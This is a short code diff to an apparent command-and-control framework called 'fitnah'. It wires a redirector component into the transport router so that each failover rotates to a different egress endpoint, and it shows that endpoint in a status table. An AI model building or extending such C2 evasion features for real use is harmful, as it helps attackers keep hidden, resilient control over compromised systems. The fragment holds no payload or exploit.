@@ -18,6 +18,7 @@ import logging
 from typing import AsyncIterator, Callable
 
 from fitnah.c2.transport.base import AbstractTransport
+from fitnah.c2.redirector import C2Redirector
 
 log = logging.getLogger(__name__)
 
@@ -37,6 +38,7 @@ class Router:
         self._active_idx        = 0             # which transport is currently primary
         self._fail_counts: dict[str, int] = {t.name: 0 for t in transports}
         self._recovery_task: asyncio.Task | None = None
+        self._redirector        = C2Redirector()
 
     # ── startup / shutdown ────────────────────────────────────────────────
     async def connect_all(self) -> None:
@@ -163,6 +165,10 @@ class Router:
             await self._trigger_failover(transport_name)
 
     async def _trigger_failover(self, failed_name: str) -> None:
+        # rotate redirector layer so next egress uses a different endpoint
+        new_endpoint = self._redirector.rotate_layer()
+        log.warning("[router] redirector rotated to layer: %s", new_endpoint)
+
         # find next alive transport after the failed one
         for t in self._transports:
             if t.name != failed_name and t.is_alive:
@@ -237,6 +243,8 @@ class Router:
 
     def status_table(self) -> str:
         lines = ["\n  Transport Status"]
+        lines.append("  " + "─" * 40)
+        lines.append(f"  Redirector endpoint: {self._redirector.get_active_endpoint()}")
         lines.append("  " + "─" * 40)
         for t in self._transports:
             role   = "primary" if t.priority == 0 else "fallback"
